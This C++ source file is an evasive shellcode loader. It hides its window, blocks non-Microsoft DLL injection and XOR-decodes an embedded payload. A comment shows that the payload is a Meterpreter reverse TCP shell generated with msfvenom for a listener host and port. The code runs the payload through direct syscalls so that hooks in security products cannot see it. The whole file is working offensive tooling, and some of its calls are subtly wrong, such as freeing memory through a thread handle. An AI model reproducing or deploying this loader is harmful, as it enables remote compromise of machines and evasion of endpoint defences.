#include <iostream>
#include <windows.h>
#include "syscall.hpp"
#include "resource.h"

static auto& syscall = freshycalls::Syscall::get_instance();

int main() {
	// prevent non-microsoft processes from injecting into the current process
	PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
	sp.MicrosoftSignedOnly = 1;
	SetProcessMitigationPolicy(ProcessSignaturePolicy, &sp, sizeof(sp));

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	ULONG oldProt = 0x0;
	HANDLE hThread;
	LPVOID baseAddr = nullptr;
	HANDLE hProc = GetCurrentProcess();

	// xvenom -> XOR encoded using Crypter: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.226.131 LPORT=443 -f raw -o xvenom.bin
	// IDR_XVENOM1 is the ID of the resource and xvenom is the name (check resource view)
	// https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
	HRSRC scResource = FindResource(NULL, MAKEINTRESOURCE(IDR_XVENOM1), L"xvenom");
	DWORD scSize = SizeofResource(NULL, scResource);
	HGLOBAL scResourceData = LoadResource(NULL, scResource);

	// XOR key
	const char schluessel[] = "R";

	SIZE_T boefLen = (SIZE_T)scSize;
	syscall.CallSyscall("NtAllocateVirtualMemory", hProc, &baseAddr, 0, (PSIZE_T)&boefLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
		.OrDie("An error happened while allocating virtual memory in the current process: \"{{result_msg}}\" (Error Code: {{result_as_hex}})");
	// copy XOR'd shellcode into memory
	memcpy(baseAddr, scResourceData, boefLen);
	// XOR the encrypted shellcode in memory
	eksor(schluessel, sizeof(schluessel), boefLen, baseAddr);
	syscall.CallSyscall("NtProtectVirtualMemory", hProc, &baseAddr, (PSIZE_T)&boefLen, PAGE_EXECUTE_READ, &oldProt)
		.OrDie("An error happened while setting virtual memory permissions in the current process: \"{{result_msg}}\" (Error Code: {{result_as_hex}})");
	syscall.CallSyscall("NtCreateThreadEx", (PHANDLE)&hThread, (ACCESS_MASK)THREAD_ALL_ACCESS, LPVOID(NULL), hProc, (LPTHREAD_START_ROUTINE)baseAddr, 0, (ULONG)FALSE, 
		(SIZE_T)NULL, (SIZE_T)NULL, (SIZE_T)NULL, (LPVOID)NULL).OrDie("An error happened while creating a new thread in the current process: \"{{result_msg}}\" (Error Code: {{result_as_hex}})");

	syscall.CallSyscall("NtWaitForSingleObject", hThread, FALSE, NULL)
		.OrDie("An error happened while waiting for single object in the current process: \"{{result_msg}}\" (Error Code: {{result_as_hex}})");
	syscall.CallSyscall("NtClose", hThread)
		.OrDie("An error happened while closing a thread in the current process: \"{{result_msg}}\" (Error Code: {{result_as_hex}})");
	syscall.CallSyscall("NtFreeVirtualMemory", hThread)
		.OrDie("An error happened while freeing virtual memory in the current process: \"{{result_msg}}\" (Error Code: {{result_as_hex}})");
	syscall.CallSyscall("NtClose", hThread)
		.OrDie("An error happened while closing a thread in the current process: \"{{result_msg}}\" (Error Code: {{result_as_hex}})");
}


// XOR in-memory
void eksor(const char* key, int keyLen, int dataLen, LPVOID startAddr) {
	BYTE* t = (BYTE*)startAddr;

	for (DWORD i = 0; i < dataLen; i++) {
		t[i] ^= key[i % keyLen];
	}
}
